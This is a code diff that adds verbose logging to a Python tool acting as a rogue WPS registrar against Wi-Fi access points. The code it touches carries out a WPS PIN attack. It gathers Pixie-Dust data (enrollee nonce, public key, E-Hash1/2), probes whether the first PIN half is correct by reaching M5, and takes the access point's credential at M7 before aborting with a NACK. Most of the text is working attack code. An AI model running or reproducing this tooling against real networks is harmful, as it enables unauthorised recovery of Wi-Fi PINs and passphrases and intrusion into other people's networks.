@@ -460,6 +460,11 @@ def wsc_assoc_ie():
     return bytes([0xDD, len(body)]) + body                 # element id 221 (vendor)
 
 
+def _wlog(verbose, msg):
+    if verbose:
+        print('[WPS] ' + msg)
+
+
 def _lookup_freq(interface, bssid):
     """Find the AP's frequency from a scan (also warms the kernel scan cache)."""
     import nl80211_scan as nl
@@ -472,7 +477,7 @@ def _lookup_freq(interface, bssid):
     return 0
 
 
-def associate(interface, bssid_bytes, ssid_bytes, freq=0):
+def associate(interface, bssid_bytes, ssid_bytes, freq=0, verbose=False):
     """Associate in MANAGED mode via nl80211 NL80211_CMD_CONNECT (no monitor mode).
 
     Returns an open netlink socket that OWNS the connection (SOCKET_OWNER) — keep
@@ -484,6 +489,7 @@ def associate(interface, bssid_bytes, ssid_bytes, freq=0):
     bssid_str = ':'.join('%02X' % b for b in bssid_bytes)
     if not freq:
         freq = _lookup_freq(interface, bssid_str)   # also populates the scan cache
+        _wlog(verbose, 'scan: AP {} on {} MHz'.format(bssid_str, freq or 'unknown'))
     sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, nl.NETLINK_GENERIC)
     sock.bind((0, 0))
     sock.settimeout(8)
@@ -510,15 +516,17 @@ def associate(interface, bssid_bytes, ssid_bytes, freq=0):
                                     nl.NLM_F_REQUEST | nl.NLM_F_ACK, attrs))
         for _ in nl._read_until_done(sock):   # consume the synchronous CONNECT ACK
             pass
+        _wlog(verbose, '→ NL80211_CMD_CONNECT sent (open auth + WSC registrar IE)')
         # CONNECT is asynchronous: wait for the result event and check its status.
-        _await_connect_result(sock, family_id)
+        _await_connect_result(sock, family_id, verbose)
+        _wlog(verbose, '← CONNECT result: associated (status 0)')
         return sock
     except Exception:
         sock.close()
         raise
 
 
-def _await_connect_result(sock, family_id):
+def _await_connect_result(sock, family_id, verbose=False):
     """Block for the NL80211_CMD_CONNECT result event; raise if status != 0."""
     import nl80211_scan as nl
     while True:
@@ -557,11 +565,16 @@ class WpsConnection:
     (NetworkManager / system wpa_supplicant) owns the interface.
     """
 
-    def __init__(self, interface, bssid, ssid='', timeout=8):
+    def __init__(self, interface, bssid, ssid='', timeout=8, verbose=False):
         self.interface = interface
         self.bssid = bssid.upper()
         self.ssid = ssid or ''
         self.timeout = timeout
+        self.verbose = verbose
+
+    def _log(self, msg):
+        if self.verbose:
+            print('[WPS] ' + msg)
 
     def _own_mac(self):
         with open('/sys/class/net/{}/address'.format(self.interface)) as f:
@@ -608,18 +621,26 @@ class WpsConnection:
 
         @stop — 'm3' (Pixie-Dust data), 'm5' (first-half check), or 'm7' (full).
         """
-        conn = associate(self.interface, _mac_bytes(self.bssid), self.ssid.encode())
+        self._log('Associating with {}…'.format(self.bssid))
+        conn = associate(self.interface, _mac_bytes(self.bssid), self.ssid.encode(),
+                         verbose=self.verbose)
+        self._log('Associated; starting EAPOL')
         eapol = EapolSocket(self.interface, _mac_bytes(self.bssid), self.timeout)
         try:
             eapol.send(eapol_start())
+            self._log('→ EAPOL-Start')
             while True:
                 info = self._recv_eap(eapol)
                 if info is None:
+                    self._log('(timeout: no further EAP frames)')
                     break
                 if info['code'] == EAP_CODE_FAIL:
+                    self._log('← EAP-Failure')
                     break
                 if info.get('type') == EAP_TYPE_IDENTITY and info['code'] == EAP_CODE_REQUEST:
+                    self._log('← EAP-Request/Identity')
                     eapol.send(eap_identity_response(info['id'], REGISTRAR_IDENTITY))
+                    self._log('→ EAP-Response/Identity ({})'.format(REGISTRAR_IDENTITY.decode()))
                     continue
                 if info.get('type') != EAP_TYPE_EXPANDED:
                     continue
@@ -627,31 +648,47 @@ class WpsConnection:
                 mtype = attrs_dict(msg).get(ATTR_MSG_TYPE)
                 if mtype == bytes([WPS_M1]):
                     reg.process_m1(msg)
+                    self._log('← M1  E-Nonce={} PKE={}B MAC={}'.format(
+                        reg.nonce_e.hex(), len(reg.pke), reg.enrollee_mac.hex()))
                     if stop == 'm1':   # just wanted the device attributes (serial)
                         eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
+                        self._log('→ WSC_NACK (serial probe done)')
                         break
                     eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m2()))
+                    self._log('→ M2  R-Nonce={} PKR={}B'.format(reg.nonce_r.hex(), len(reg.pkr)))
                 elif mtype == bytes([WPS_M3]):
                     reg.process_m3(msg)
+                    self._log('← M3  E-Hash1={} E-Hash2={}'.format(
+                        reg.e_hash1.hex(), reg.e_hash2.hex()))
                     if stop == 'm3':
                         eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
+                        self._log('→ WSC_NACK (Pixie-Dust data collected)')
                         break
                     eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m4()))
+                    self._log('→ M4  (R-Hash1/2 + encrypted R-S1)')
                 elif mtype == bytes([WPS_M5]):
                     # The AP only reaches M5 if our M4 R-Hash1 matched, i.e. the
                     # first PIN half is correct.
                     reg.reached_m5 = True
+                    self._log('← M5  (first PIN half accepted)')
                     if stop == 'm5':
                         eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
+                        self._log('→ WSC_NACK (first-half probe done)')
                         break
                     reg.process_m5(msg)
                     eapol.send(eap_wsc_response(info['id'], WSC_MSG, reg.build_m6()))
+                    self._log('→ M6  (encrypted R-S2)')
                 elif mtype == bytes([WPS_M7]):
                     reg.process_m7(msg)
+                    self._log('← M7  (AP credential received)')
                     # Learn-only registrar: NACK to abort cleanly (do not send
                     # WSC_Done, which is the enrollee's op-code).
                     eapol.send(eap_wsc_response(info['id'], WSC_NACK, b''))
+                    self._log('→ WSC_NACK (done)')
                     break
+                elif info.get('op_code') is not None:
+                    self._log('← WSC op_code={} (unhandled, msg type={})'.format(
+                        info['op_code'], mtype.hex() if mtype else 'none'))
             return reg
         finally:
             eapol.close()
